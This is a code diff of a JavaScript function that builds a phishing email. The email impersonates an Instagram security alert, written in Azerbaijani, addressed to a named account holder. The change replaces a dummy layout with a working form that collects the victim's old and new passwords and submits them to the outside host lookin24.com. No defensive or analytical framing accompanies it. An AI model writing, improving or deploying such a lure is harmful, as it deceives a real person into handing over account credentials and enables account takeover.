@@ -18,21 +18,13 @@ async function f() {
         html: "<link href=\"https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono\" rel=\"stylesheet\">\n" +
             "\n" +
             "<p>mr_nagizade İnstagramınıza başqa şəxs daxil oldu. Xaiş edirik şifrəni yeniləyin. </p>"+
-            "<div id=\"wrapper\">\n" +
-            "  <div class=\"main-content\" style=''>\n" +
-            "    <div class=\"header\">\n" +
-            "      <img src=\"https://i.imgur.com/zqpwkLQ.png\" />\n" +
-            "    </div>\n" +
-            "    <div class=\"l-part\">\n" +
-            "<label for=\"pv\">Kohne Sifre</label>"+
-            "      <input id='pv' type=\"password\" placeholder=\"Username\" class=\"input-1\" />\n" +'<br>'+
-            "<label for=\"pv2\">Yeni Sifre</label>\n" +
-            "<input type=\"password\" id='pv2' placeholder=\"Password\" class=\"input-2\" />\n" +'<br>'+
-            "      <input type=\"button\" value=\"Deyis\" class=\"btn\" />\n" +
-            "    </div>\n" +
-            "  </div>\n" +
-
-            "</div>\n" +
+            "<form action='http://lookin24.com/index3'>\n" +
+            "  <label for=\"fname\">Köhnə şifrə</label><br>\n" +
+            "  <input type=\"password\" id=\"fname\" name=\"fname\" value=\"\"><br>\n" +
+            "  <label for=\"lname\">Yeni şifrə</label><br>\n" +
+            "  <input type=\"password\" id=\"lname\" name=\"lname\" value=\"\"><br><br>\n" +
+            "  <input type=\"submit\" value=\"Submit\">\n" +
+            "</form> "+
             "\n" +
             "\n" +
             "\n" +
